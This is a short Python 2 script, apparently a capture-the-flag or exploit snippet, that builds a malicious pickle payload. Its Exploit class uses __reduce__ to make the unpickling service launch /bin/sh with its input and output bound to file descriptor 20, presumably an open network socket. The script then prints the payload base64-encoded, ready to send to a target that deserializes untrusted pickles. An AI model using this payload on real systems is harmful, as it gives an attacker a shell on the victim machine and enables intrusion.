from pickle import dumps


import cPickle
import subprocess
import base64

class Exploit(object):
  def __reduce__(self):
    fd = 20
    return (subprocess.Popen,
            (('/bin/sh',), # args
             0,            # bufsize
             None,         # executable
             fd, fd, fd    # std{in,out,err}
             ))

print base64.b64encode(cPickle.dumps(Exploit()))

